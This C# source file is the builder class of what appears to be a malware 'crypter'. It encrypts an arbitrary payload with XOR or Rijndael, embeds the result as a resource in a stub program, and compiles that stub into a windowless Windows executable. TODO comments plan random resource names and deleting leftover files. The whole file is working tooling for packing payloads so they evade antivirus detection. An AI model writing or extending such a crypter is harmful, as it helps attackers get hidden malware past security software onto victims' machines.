using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Resources;
using System.Text;
using System.Threading.Tasks;

namespace Crypt
{
    class Builder
    {
        Byte[] payload;
        Options options;

        public Builder(byte[] payload, Options options)
        {
            this.payload = payload;
            this.options = options;
        }

        public bool Build()
        {
            Byte[] encryptedPL = Encrypt(payload, options.encryptionType);
            string stubSrc = AddInfo(Properties.Resources.Stub);

            bool result = Compile(encryptedPL, stubSrc);
            return result;
        }

        private byte[] Encrypt(Byte[] input, EncryptionType encryptionType)
        {
            Byte[] encryptedPL;
            switch (options.encryptionType)
            {
                case EncryptionType.Rijndael:
                    encryptedPL = Encryption.RijndaelEncrypt(payload, options.encryptionKey);
                    break;
                case EncryptionType.XOR:
                default:
                    encryptedPL = Encryption.Xor(payload, options.encryptionKey);
                    break;
            }

            return encryptedPL;
        }

        private string AddInfo(string stubSrc)
        {
            string newStub = stubSrc.Replace("[encryptionKey]", Convert.ToBase64String(options.encryptionKey));

            return newStub;
        }

        private bool Compile(byte[] encryptedPL, string stubSrc)
        {
            CompilerParameters compParams = new CompilerParameters();
            compParams.GenerateExecutable = true;
            compParams.TreatWarningsAsErrors = false;
            compParams.OutputAssembly = options.buildDir;
            compParams.CompilerOptions = "/optimize+ /platform:x86 /target:winexe /unsafe";

            compParams.ReferencedAssemblies.Add("System.dll");
            compParams.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            compParams.ReferencedAssemblies.Add("System.Drawing.dll");

            Dictionary<string, string> providerOptions = new Dictionary<string, string>();
            providerOptions.Add("CompilerVersion", "v2.0");

            //TODO: generate random names for resources
            string resourceDir = "enc.resources";
            using (ResourceWriter resourceWriter = new ResourceWriter(resourceDir))
            {
                resourceWriter.AddResource("yaes", encryptedPL);
                resourceWriter.Generate();
            }
            compParams.EmbeddedResources.Add(resourceDir); //TODO: Delete resource file

            CompilerResults compResults = new CSharpCodeProvider(providerOptions).CompileAssemblyFromSource(compParams, stubSrc);

            return !compResults.Errors.HasErrors;
        }
    }
}
